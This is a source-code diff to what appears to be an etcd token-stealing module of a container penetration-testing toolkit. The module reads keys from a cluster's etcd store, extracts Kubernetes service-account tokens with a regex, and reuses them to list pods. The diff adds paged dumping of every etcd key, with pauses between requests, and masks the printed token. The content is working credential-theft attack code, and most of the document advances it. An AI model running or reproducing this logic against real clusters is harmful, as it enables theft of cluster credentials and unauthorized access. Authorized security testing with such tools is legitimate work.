@@ -27,7 +27,9 @@ import (
 	"log"
 	"net/url"
 	"regexp"
+	"sort"
 	"strings"
+	"time"
 
 	"github.com/cdk-team/CDK/pkg/audit/base"
 
@@ -35,6 +37,7 @@ import (
 	"github.com/cdk-team/CDK/pkg/plugin"
 	"github.com/cdk-team/CDK/pkg/tool/etcdctl"
 	"github.com/cdk-team/CDK/pkg/tool/kubectl"
+	"github.com/cdk-team/CDK/pkg/util"
 	"github.com/tidwall/gjson"
 )
 
@@ -127,12 +130,7 @@ func (p EtcdGetToken) Run() bool {
 	}
 
 	var flag bool
-	resp, err := etcdctl.DoRequest(opt)
-	if err != nil {
-		log.Println(err)
-		return flag
-	}
-	keys, err := etcdctl.GetKeys(resp, opt.Silent)
+	keys, err := collectEtcdKeysPaged(opt)
 	if err != nil {
 		log.Println(err)
 		return flag
@@ -155,7 +153,7 @@ func (p EtcdGetToken) Run() bool {
 					token := regexp.MustCompile("eyJh[\\w\\.-]+").FindString(v)
 					if token != "" {
 						flag = true
-						fmt.Println(fmt.Sprintf("[%s] %s", k, token))
+						fmt.Println(fmt.Sprintf("[%s] %s", k, util.RedactedValue(token)))
 						resp, err := getPods(token, endpoint)
 						if err == nil {
 							pods := gjson.Get(resp, "items").Array()
@@ -170,6 +168,33 @@ func (p EtcdGetToken) Run() bool {
 		}
 	}
 	return flag
+}
+
+func collectEtcdKeysPaged(opt etcdctl.EtcdRequestOption) (map[string]string, error) {
+	collected := map[string]string{}
+	startKey := "/"
+	for {
+		opt.PostData = etcdctl.GenerateRangeQuery(startKey, 100)
+		resp, err := etcdctl.DoRequest(opt)
+		if err != nil {
+			return collected, err
+		}
+		keys, err := etcdctl.GetKeys(resp, opt.Silent)
+		if err != nil {
+			return collected, err
+		}
+		pageKeys := make([]string, 0, len(keys))
+		for k, v := range keys {
+			collected[k] = v
+			pageKeys = append(pageKeys, k)
+		}
+		if !gjson.Get(resp, "more").Bool() || len(pageKeys) == 0 {
+			return collected, nil
+		}
+		sort.Strings(pageKeys)
+		startKey = pageKeys[len(pageKeys)-1] + "\x00"
+		time.Sleep(20 * time.Millisecond)
+	}
 }
 
 func detectEtcdService(endpoint string, tlsConfig *tls.Config) bool {
